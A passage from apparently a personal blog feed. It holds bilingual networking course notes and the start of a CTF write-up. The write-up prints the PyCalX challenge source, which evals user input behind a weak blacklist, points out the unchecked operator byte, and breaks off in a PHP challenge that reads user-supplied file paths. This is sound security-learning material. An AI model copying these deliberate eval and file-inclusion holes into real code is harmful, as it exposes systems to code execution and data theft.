bandwidth.<br>节点根据跳数、延迟或带宽等距离度量计算到网络中其他节点的“最短路径”。<br>Examples:<br> <code>Routing Information Protocol</code> (RIP)<br> <code>Interior Gateway Routin Protocol</code> (IGRP).</p></li><li><p>Path-vector routing 路径向量路由<br>each node maintains a list of autonomous systems that packets must traverse to reach their destination. This type of routing is commonly used in large-scale networks such as the Internet, where multiple autonomous systems are involved in routing traffic between different regions.<br>每个节点都维护一个自治系统列表，数据包必须经过这些系统才能到达目的地。 这种类型的路由通常用于大型网络（例如 Internet），其中涉及多个自治系统以在不同区域之间路由流量。<br> Eg:<br> <code>Border Gateway Protocol</code> (BGP)<br> <code>Path Vector Protocol</code> (PVP)</p></li><li><p>Link-state routing 链路状态路径选择<br>decentralized networks where each node shares information about its neighbors and the status of its links with all other nodes in the network.  Using <code>Dijkstra&#39;s algorithm</code><br>分散式网络，其中每个节点共享有关其相邻的信息及其与网络中所有其他节点的链接状态。 使用“Dijkstra 算法”<br>Eg:<br> <code>Open Shortest Path First</code> (OSPF)<br> <code>Intermediate System to Intermediate System</code> (IS-IS). 中级(中间)系统到中级系统</p></li><li><p>Source routing 源路由选择<br> the source node specifies the path that packets should take to reach their destination. This approach allows for more control over the routing of packets but can be more complex and less scalable than other routing algorithms.<br> 用于分散网络的路由算法，其中源节点指定数据包到达目的地应采用的路径。 这种方法允许对数据包路由进行更多控制，但与其他路由算法相比可能更复杂且可扩展性更差。<br> Eg:<br>  <code>Multiprotocol Label Switching</code> (MPLS) 多协议标签交换<br>  <code>Source-Tree Adaptive Routing</code> (STAR) 源树自适应路由</p></li></ol><h2 id="Compare-Distance-Vector-and-Link-state-Routing-protocol"><a href="#Compare-Distance-Vector-and-Link-state-Routing-protocol" class="headerlink" title="Compare Distance Vector and Link state Routing protocol"></a>Compare Distance Vector and Link state Routing protocol</h2><table><thead><tr><th>Distance Vector距离矢量协议</th><th>Link state链路状态协议</th></tr></thead><tbody><tr><td>simpler to implement and use less bandwidth, but may take longer to converge in large networks</td><td>require more processing power and bandwidth, but can converge more quickly and provide more accurate routing information.</td></tr><tr><td>更容易实现并且使用更少的带宽，但可能需要更长的时间才能在大型网络中收敛</td><td>需要更多的处理能力和带宽，但可以更快地收敛并提供更准确的路由信息</td></tr><tr><td>距离矢量路由协议的一个示例是路由信息协议 (RIP)，它通常用于中小型网络。 RIP 根据节点间的跳数计算到达目的地的最佳路径，并通过向其邻居广播其整个路由表每 30 秒更新一次路由表。</td><td>链路状态路由协议的一个示例是开放最短路径优先 (OSPF) 协议，它通常用于大型企业网络。 OSPF 依赖于每个节点将有关其本地连接的信息广播到网络中的所有其他节点，这些信息用于构建网络拓扑的完整地图。 然后使用此信息使用 Dijkstra 算法计算到目的地的最短路径。</td></tr></tbody></table><h2 id="Router-amp-switch"><a href="#Router-amp-switch" class="headerlink" title="Router &amp; switch"></a>Router &amp; switch</h2><p><strong>Router 路由器</strong>： 位于网络层，根据目标地址将数据包从一个网络传输到另一个网络，并负责在不同的网络之间转发数据。路由器通常使用路由协议来建立和维护路由表，以便选择最佳路径将数据包传输到目标网络。</p><p><strong>Switch 交换机</strong>： 数据链路层，在局域网内转发数据包，通过学习 <code>MAC地址</code> 并将数据包转发到适当的端口来实现局域网内的通信。交换机通常使用 <code>MAC地址表</code> 来决定将数据包转发到哪个端口。</p><p><em>(技术迭代更新)，现在大部分路由器和交换机具有多层功能，可以在多个层次上工作。</em><br>路由器和交换机可以支持在第四层（传输层）和第七层（应用层）上执行负载平衡和流量控制。</p><hr><h1 id="week9"><a href="#week9" class="headerlink" title="week9"></a>week9</h1><p>应用层<br><a href="https://www.redhat.com/en/topics/cloud-native-apps/what-is-an-application-architecture">what is application architectures</a><br><a href="https://blog.csdn.net/kieson_uabc/article/details/106210762">计算机网络–应用层</a></p><h2 id="two-main-technologies-of-World-Wide-Web-WWW"><a href="#two-main-technologies-of-World-Wide-Web-WWW" class="headerlink" title="two main technologies of World Wide Web (WWW)"></a>two main technologies of World Wide Web (WWW)</h2><ol><li><code>Hypertext Markup Language (HTML)</code>: <strong>HTML is the standard markup language used to create and structure content on the web.</strong> It provides a set of tags that define the structure and layout of a web page, such as headings, paragraphs, images, links, and more. <code>HTML</code> is interpreted by web browsers, which use it to render the content of a web page to the user. <code>HTML</code> is constantly evolving, with new versions being released regularly to incorporate new features and improvements.</li></ol><p>HTML 是用于在 Web 上创建和构建内容的标准标记语言。 它提供了一组定义网页结构和布局的标签，例如标题、段落、图像、链接等。 HTML 由 Web 浏览器解释，Web 浏览器使用它向用户呈现网页内容。 HTML 不断发展，定期发布新版本以包含新功能和改进。 </p><ol start="2"><li><code>Hypertext Transfer Protocol (HTTP)</code>: <strong>HTTP is the protocol used by web browsers and web servers to communicate with each other over the internet.</strong> It defines how requests and responses should be formatted and transmitted, and provides a set of rules that govern how web browsers should interact with web servers. HTTP enables web browsers to request web pages from web servers and receive responses in the form of HTML documents, images, videos, and other types of content. HTTPS (HTTP Secure) is a secure version of HTTP that encrypts the data being transmitted, providing an additional layer of security for sensitive information such as login credentials and financial transactions.</li></ol><p>HTTP 是 Web 浏览器和 Web 服务器用于通过 Internet 相互通信的协议。 它定义了请求和响应的格式和传输方式，并提供了一组规则来管理 Web 浏览器应如何与 Web 服务器交互。 HTTP 使 Web 浏览器能够从 Web 服务器请求网页并接收 HTML 文档、图像、视频和其他类型内容形式的响应。 HTTPS (HTTP Secure) 是 HTTP 的安全版本，可对传输的数据进行加密，为登录凭据和金融交易等敏感信息提供额外的安全保护层。</p><p><a href="https://blog.csdn.net/qzwzsl/article/details/125731575">什么是https（加密）协议，彻底搞懂https</a><br><a href="https://blog.csdn.net/summer_fish/article/details/125279853">TLS 详解</a><br><a href="https://blog.csdn.net/qq_38265137/article/details/90112705">SSL协议原理详解</a></p><h2 id="Explain-these-email-protocols-SMTP-POP-amp-IMAPS"><a href="#Explain-these-email-protocols-SMTP-POP-amp-IMAPS" class="headerlink" title="Explain these email protocols: SMTP, POP &amp; IMAPS"></a>Explain these email protocols: SMTP, POP &amp; IMAPS</h2><p><a href="https://blog.csdn.net/dglf54292/article/details/101232322">电子邮件的三个协议: SMTP、IMAP、POP3</a><br><a href="https://blog.csdn.net/qq_25047389/article/details/127660733">邮箱协议类型(Mailbox Protocols)</a></p><ol><li>Simple Mail Transfer Protocol (SMTP): SMTP is a protocol used for sending email messages from one server to another over the internet. When you send an email, your email client or webmail application uses SMTP to communicate with your email server and send the message to the recipient’s email server. SMTP is a reliable and efficient protocol that supports a range of features, including authentication, encryption, and error reporting.<br>简单邮件传输协议 (SMTP)：SMTP 是一种用于通过 Internet 从一台服务器向另一台服务器发送电子邮件的协议。 当您发送电子邮件时，您的电子邮件客户端或网络邮件应用程序使用 SMTP 与您的电子邮件服务器通信并将消息发送到收件人的电子邮件服务器。 SMTP 是一种可靠且高效的协议，支持一系列功能，包括身份验证、加密和错误报告。</li></ol><p><a href="https://blog.csdn.net/qq_39583450/article/details/113185659">Email应用：SMTP协议及邮件访问协议</a></p><ol start="2"><li><p>Post Office Protocol (POP): POP is a protocol used for retrieving email messages from a remote email server to your local email client. When you check your email using a POP client, it downloads the messages from the server and stores them on your computer or device. By default, POP downloads and removes the messages from the server, so they can only be accessed from the local device where they were downloaded. However, many email clients allow you to configure POP to leave a copy of the messages on the server, so you can access them from multiple devices.<br>邮局协议 (POP)：POP 是一种用于将电子邮件从远程电子邮件服务器检索到本地电子邮件客户端的协议。 当您使用 POP 客户端查看电子邮件时，它会从服务器下载邮件并将它们存储在您的计算机或设备上。 默认情况下，POP 从服务器下载和删除消息，因此只能从下载它们的本地设备访问它们。 但是，许多电子邮件客户端允许您将 POP 配置为在服务器上保留邮件副本，以便您可以从多个设备访问它们。</p></li><li><p>Internet Message Access Protocol (IMAP): IMAP is a protocol used for accessing email messages stored on a remote email server. Unlike POP, IMAP allows you to manage your email messages on the server, so changes you make to your email on one device are reflected on all other devices that access the same account. This makes IMAP a better option for users who access their email from multiple devices. IMAP also supports a range of features, including message searching, message flags, and server-based email filtering.<br>Internet 消息访问协议 (IMAP)：IMAP 是一种用于访问存储在远程电子邮件服务器上的电子邮件的协议。 与 POP 不同，IMAP 允许您在服务器上管理您的电子邮件，因此您在一台设备上对电子邮件所做的更改会反映在访问同一帐户的所有其他设备上。 这使得 IMAP 成为从多个设备访问电子邮件的用户的更好选择。 IMAP 还支持一系列功能，包括消息搜索、消息标记和基于服务器的电子邮件过滤。</p></li><li><p>IMAP Secure (IMAPS): IMAPS is a secure version of IMAP that encrypts the data being transmitted between your email client and the email server, providing an additional layer of security for sensitive information such as login credentials and email messages. IMAPS uses SSL&#x2F;TLS encryption to protect the data in transit, making it much harder for hackers to intercept and read the emails.</p></li></ol><h2 id="S-means-SSL-x2F-TLS-secure-version"><a href="#S-means-SSL-x2F-TLS-secure-version" class="headerlink" title="S means SSL&#x2F;TLS secure version   "></a><strong>S means SSL&#x2F;TLS secure version</strong>   </h2><h2 id="MIME"><a href="#MIME" class="headerlink" title="MIME"></a>MIME</h2><p><a href="https://blog.csdn.net/qq_34227896/article/details/80326121">MIME协议详解</a><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/MIME_types">MIME 类型</a><br>TCP-IP详解 卷1 P347</p><hr><h1 id="week10"><a href="#week10" class="headerlink" title="week10"></a>week10</h1><h2 id="Applied-2"><a href="#Applied-2" class="headerlink" title="Applied"></a>Applied</h2><ul><li><p><font color="blue">Circuit capacity on a backbone network will be improved by:</font><br>going from 100Base-T Ethernet to gigabit Ethernet</p></li><li><p>A <font color="blue">virtual private network(VPN)</font> is a particular type of network that uses circuits that run over the Internet but that appears to the user to be a private network.</p></li><li><p>Which of the following type of networks permit packets from separate messages to be interleaved?<br>packet switched network</p></li><li><p>Most backbone devices are store-and-forward devices. One simple way to improve performance is to ensure that they have<br>sufficient memory</p></li><li><p>With a virtual private network, users create permanent virtual circuits through the Internet called:<br>tunnels</p></li></ul><p>What’s a Metropolitan Area Network (MAN)?<br>What is a Wide Area Network (WAN)?<br><a href="https://blog.csdn.net/fuhanghang/article/details/129496548">城域网介绍</a><br><a href="https://blog.csdn.net/yihuliunian/article/details/89949809">局域网、城域网、广域网、国际互联网(internet)</a></p><hr><h1 id="week11"><a href="#week11" class="headerlink" title="week11"></a>week11</h1><p>对称密钥加密 Symmetric Key Cryptography<br>非对称密钥加密(AKA-公钥加密) Asymmetric Key Cryptography (AKA - Public Key Cryptography)</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/qq_40279192/article/details/107679630">对称与非对称密钥加密</a><br><a href="https://blog.csdn.net/notechsolution/article/details/106604593">一文详解对称密钥加密</a><br><a href="https://cloud.google.com/kms/docs/encrypt-decrypt?hl=zh-cn#kms-encrypt-symmetric-php">加解密算法</a></p><hr><h1 id="week12-final-quiz"><a href="#week12-final-quiz" class="headerlink" title="week12 final quiz!!!"></a>week12 final quiz!!!</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A</summary>
      
    
    
    
    <category term="Monash笔记" scheme="https://manayakko.github.io/yakko117/categories/Monash%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Monash Cs" scheme="https://manayakko.github.io/yakko117/tags/Monash-Cs/"/>
    
  </entry>
  
  <entry>
    <title>BuuctfDay10</title>
    <link href="https://manayakko.github.io/yakko117/2022/01/04/BUUCTFDay10/"/>
    <id>https://manayakko.github.io/yakko117/2022/01/04/BUUCTFDay10/</id>
    <published>2022-01-04T06:26:53.237Z</published>
    <updated>2023-04-18T21:45:59.795Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="PyCalX-1-amp-2"><a href="#PyCalX-1-amp-2" class="headerlink" title="PyCalX 1&amp;2"></a>PyCalX 1&amp;2</h1><p>基础须知 <a href="https://www.anquanke.com/post/id/85571">从一个CTF题目学习Python沙箱逃逸</a><br><a href="https://cloud.tencent.com/developer/article/1037998">技术分享 | 谈一谈CTF中的python沙箱逃逸</a><br>虽然沙盒逃逸大部分是PWN题，但还是感谢巨巨做了Web类型的，让我来学习了解</p><h2 id="PyCalX-1"><a href="#PyCalX-1" class="headerlink" title="PyCalX 1"></a>PyCalX 1</h2><p>题目信息 This code is supposed to be unexploitable :&#x2F; another pyjail?</p><p>Notice: The flag may contain non alphabetic characters (but still printable)</p><p>Please login to submit flag</p><p>启动靶机 <code>/cgi-bin/pycalx.py</code>，进入题目</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202201091200580.jpg" data-fancybox="group" data-caption="PyCalx1" class="fancybox"><img alt="PyCalx1" title="PyCalx1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img3/202201091200580.jpg" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> cgi;</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> html <span class="keyword">import</span> escape</span><br><span class="line"></span><br><span class="line">FLAG = <span class="built_in">open</span>(<span class="string">&#x27;/var/www/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">OK_200 = <span class="string">&quot;&quot;&quot;Content-type: text/html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;title&gt;PyCalx&lt;/title&gt;</span></span><br><span class="line"><span class="string">&lt;h1&gt;PyCalx&lt;/h1&gt;</span></span><br><span class="line"><span class="string">&lt;form&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4&quot; type=text name=value1 placeholder=&#x27;Value 1 (Example: 1  abc)&#x27; autofocus/&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4&quot; type=text name=op placeholder=&#x27;Operator (Example: + - * ** / // == != )&#x27; /&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4&quot; type=text name=value2 placeholder=&#x27;Value 2 (Example: 1  abc)&#x27; /&gt;</span></span><br><span class="line"><span class="string">&lt;input class=&quot;form-control col-md-4 btn btn-success&quot; type=submit value=EVAL /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;a href=&#x27;?source=1&#x27;&gt;Source&lt;/a&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(OK_200)</span><br><span class="line">arguments = cgi.FieldStorage()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;source&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line">    source = arguments[<span class="string">&#x27;source&#x27;</span>].value</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    source = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> source == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>+escape(<span class="built_in">str</span>(<span class="built_in">open</span>(__file__,<span class="string">&#x27;r&#x27;</span>).read()))+<span class="string">&#x27;&lt;/pre&gt;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;value1&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;value2&#x27;</span> <span class="keyword">in</span> arguments <span class="keyword">and</span> <span class="string">&#x27;op&#x27;</span> <span class="keyword">in</span> arguments:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_value</span>(<span class="params">val</span>):</span><br><span class="line">        val = <span class="built_in">str</span>(val)[:<span class="number">64</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">str</span>(val).isdigit(): <span class="keyword">return</span> <span class="built_in">int</span>(val)</span><br><span class="line">        blacklist = [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>] <span class="comment"># I don&#x27;t like tuple, list and dict.</span></span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&lt;center&gt;Invalid value&lt;/center&gt;&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_op</span>(<span class="params">val</span>):</span><br><span class="line">        val = <span class="built_in">str</span>(val)[:<span class="number">2</span>]</span><br><span class="line">        list_ops = [<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;</span>)</span><br><span class="line">            sys.exit(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line">    op = get_op(arguments[<span class="string">&#x27;op&#x27;</span>].value)</span><br><span class="line">    value1 = get_value(arguments[<span class="string">&#x27;value1&#x27;</span>].value)</span><br><span class="line">    value2 = get_value(arguments[<span class="string">&#x27;value2&#x27;</span>].value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(value1).isdigit() ^ <span class="built_in">str</span>(value2).isdigit():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&lt;center&gt;Types of the values don\&#x27;t match&lt;/center&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    calc_eval = <span class="built_in">str</span>(<span class="built_in">repr</span>(value1)) + <span class="built_in">str</span>(op) + <span class="built_in">str</span>(<span class="built_in">repr</span>(value2))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt;&gt; print(&#x27;</span>+escape(calc_eval)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = <span class="built_in">str</span>(<span class="built_in">eval</span>(calc_eval))</span><br><span class="line">        <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">&#x27;True&#x27;</span> <span class="keyword">or</span> result == <span class="string">&#x27;False&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid&quot;</span>) <span class="comment"># Sorry we don&#x27;t support output as a string due to security issue.</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; &lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span>)</span><br></pre></td></tr></table></figure></div><p>一个有限制的Python表达式运算的东西。 </p><p>涉及的变量包括<code>source</code>，<code>op</code>，<code>value1</code>，<code>value2</code>，<code>FLAG</code>四个。 </p><ul><li><code>source</code>，若值为1则显示源代码。</li><li><code>value1</code>，运算的第一个变量。 </li><li><code>value2</code>，运算的第二个变量。 </li><li><code>op</code>，运算符。 </li><li><code>FLAG</code>，读取FLAG，存在变量里面。</li></ul><p>下面两个函数对于运算变量和运算符进行限制，一个白名单一个黑名单</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>(<span class="params">val</span>):</span><br><span class="line">    val = <span class="built_in">str</span>(val)[:<span class="number">64</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(val).isdigit(): <span class="keyword">return</span> <span class="built_in">int</span>(val)</span><br><span class="line">    blacklist = [<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>] </span><br><span class="line">    <span class="comment"># I don&#x27;t like tuple, list and dict.</span></span><br><span class="line">    <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> [c <span class="keyword">for</span> c <span class="keyword">in</span> blacklist <span class="keyword">if</span> c <span class="keyword">in</span> val] != []:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&lt;center&gt;Invalid value&lt;/center&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> val</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_op</span>(<span class="params">val</span>):</span><br><span class="line">    val = <span class="built_in">str</span>(val)[:<span class="number">2</span>]</span><br><span class="line">    list_ops = [<span class="string">&#x27;+&#x27;</span>,<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;!&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> val == <span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> val[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> list_ops:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;&lt;center&gt;Invalid op&lt;/center&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> val</span><br></pre></td></tr></table></figure></div><p><code>get_op()</code> 这个函数首先是限制运算符的有效长度为 <code>2</code>，然后通过白名单 <code>+，-，/，*，=，!</code> 限制了运算符的第一个字节，第二个字节没做限制。</p><p>然后通过以上函数对变量进行限制之后，下面的模块是对输入内容进行字符串转换，然后重新拼接成新的 <code>calc_eval</code> 表达式</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">calc_eval = <span class="built_in">str</span>(<span class="built_in">repr</span>(value1)) + <span class="built_in">str</span>(op) + <span class="built_in">str</span>(<span class="built_in">repr</span>(value2))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&lt;div class=container&gt;&lt;div class=row&gt;&lt;div class=col-md-2&gt;&lt;/div&gt;&lt;div class=&quot;col-md-8&quot;&gt;&lt;pre&gt;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt;&gt; print(&#x27;</span>+escape(calc_eval)+<span class="string">&#x27;)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    result = <span class="built_in">str</span>(<span class="built_in">eval</span>(calc_eval))</span><br><span class="line">    <span class="keyword">if</span> result.isdigit() <span class="keyword">or</span> result == <span class="string">&#x27;True&#x27;</span> <span class="keyword">or</span> result == <span class="string">&#x27;False&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid&quot;</span>) </span><br><span class="line">        <span class="comment"># Sorry we don&#x27;t support output as a string due to security issue.</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid&quot;</span>)</span><br></pre></td></tr></table></figure></div><p><a href="https://www.secpulse.com/archives/73724.html">https://www.secpulse.com/archives/73724.html</a> </p><hr><h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span 